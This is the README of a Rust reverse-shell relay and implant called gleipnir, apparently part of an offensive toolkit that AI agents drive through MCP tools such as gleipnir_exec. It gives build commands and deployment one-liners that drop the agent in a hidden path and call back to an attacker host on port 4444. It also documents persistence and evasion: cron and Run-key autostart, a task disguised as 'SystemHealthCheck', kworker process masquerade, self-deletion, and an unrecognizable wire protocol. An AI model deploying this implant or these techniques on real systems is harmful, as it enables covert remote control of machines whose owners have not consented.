# gleipnir

Persistent reverse shell handler + agent for PromptKiddie engagements.

## Architecture

Two Rust binaries in one Cargo workspace:

- **Relay** (runs on the attackbox): TCP/TLS listener, session manager, Unix socket JSON
  API for CLI/MCP integration, SOCKS5 proxy server. Auto-generates a self-signed TLS cert
  on startup. Starts automatically via `docker compose up`.
- **Agent** (deployed to targets): reverse TCP/TLS connect with auto-reconnect and
  exponential backoff, platform-aware command execution, chunked file transfer, SOCKS5
  tunneling. Single static binary, cross-compiled per target.

Communication uses a custom binary wire protocol (`0x504B524C` framing) over TCP or TLS.
No HTTP, no protobuf, no recognizable protocol signatures.

## Build

```bash
# Relay (TLS on by default, auto-generates self-signed cert)
cargo build --release

# Agent (slim, no TLS, ~500KB)
cargo build --release --bin gleipnir-agent --no-default-features

# Agent with TLS (~1.5MB)
cargo build --release --bin gleipnir-agent --features tls

# Cross-compile agent for Windows
cross build --release --bin gleipnir-agent --target x86_64-pc-windows-gnu

# Cross-compile agent for Linux (static musl)
cross build --release --bin gleipnir-agent --target x86_64-unknown-linux-musl
```

Pre-compiled agent binaries are available in the attackbox at `/opt/gleipnir/agents/`
(fetched from GitHub releases on build).

## Quick start

```bash
# Relay starts with docker compose (default port 4444, auto TLS)
docker compose up -d

# Deploy agent to a target
pk upload mysession $(pk agent path linux-amd64-tls) /tmp/.cache
pk shell exec mysession "chmod +x /tmp/.cache && /tmp/.cache -H 10.10.14.5 -p 4444 --tls &"

# Verify connection
pk shell list
pk shell exec mysession "whoami"
```

## CLI commands

| Command | Description |
|---------|-------------|
| `pk shell list` | List active sessions |
| `pk shell exec <session> <cmd>` | Execute a command on target |
| `pk shell attach <session>` | Interactive REPL |
| `pk shell info <session>` | Session details (OS, arch, user) |
| `pk upload <session> <src> <dst>` | Upload file to target |
| `pk download <session> <src> <dst>` | Download file from target |
| `pk tunnel up <session> --socks <port>` | Start SOCKS5 proxy |
| `pk tunnel status` | List active tunnels |
| `pk tunnel down <session>` | Stop a tunnel |
| `pk agent list` | List available agent binaries |
| `pk agent path <target>` | Print path to agent binary |

## Agent flags

```
-H, --host <hosts>         Callback host(s), comma-separated for fallback
-p, --port <port>          Callback port (default: 4444)
    --tls                  Enable TLS (accepts any cert by default)
    --tls-ca <path>        CA cert for TLS verification
    --session-id <id>      Stable session ID (auto-generated if omitted)
    --cmd-timeout <secs>   Command timeout (default: 300)
    --max-retry-interval   Max reconnect backoff (default: 30s)
    --install <dir>        Copy binary to hidden path and run from there
    --masquerade <name>    Process name masquerade (Linux: prctl)
    --cron                 Linux: install @reboot cron entry
    --registry             Windows: install HKCU Run key (instead of schtasks)
    --task-name <name>     Windows scheduled task name (default: SystemHealthCheck)
    --self-delete          Delete the binary from disk after loading
```

## Persistence

**Linux:** `--cron` installs an `@reboot` crontab entry. `--install /tmp/.X11`
copies the binary and runs from the hidden path. `--masquerade kworker/0:1` sets
the process name via prctl.

**Windows:** `--cron` creates a scheduled task (onlogon, highest privilege).
`--registry` uses `HKCU\...\Run` instead. `--install ""` defaults to
`%APPDATA%\Microsoft\update.exe` with `attrib +h`. `--self-delete` uses
`cmd /c ping & del` for delayed deletion.

## Relay flags

```
    --listen <addr>        Bind address (default: 0.0.0.0)
-p, --port <port>          Listener port (default: 4444)
    --api-socket <path>    Unix socket for CLI/MCP (default: /tmp/gleipnir.sock)
    --tls-cert <path>      TLS cert PEM (auto-generated if omitted)
    --tls-key <path>       TLS key PEM
    --no-tls               Disable TLS (plain TCP)
```

## Tests

```bash
cargo test -- --test-threads=1         # 29 tests (24 unit + 5 integration)
cargo test --no-default-features -- --test-threads=1  # 28 tests (plain TCP)
bash tests/e2e.sh                      # 7 E2E tests
bash tests/hostile.sh                  # 13 hostile edge-case tests
bash tests/koth.sh                     # 17 KotH adversarial tests
```

## MCP tools

Agents use these tools (registered in `packages/tooling-mcp`) to interact with sessions:
`gleipnir_exec`, `gleipnir_upload`, `gleipnir_download`, `gleipnir_sessions`,
`gleipnir_tunnel`.
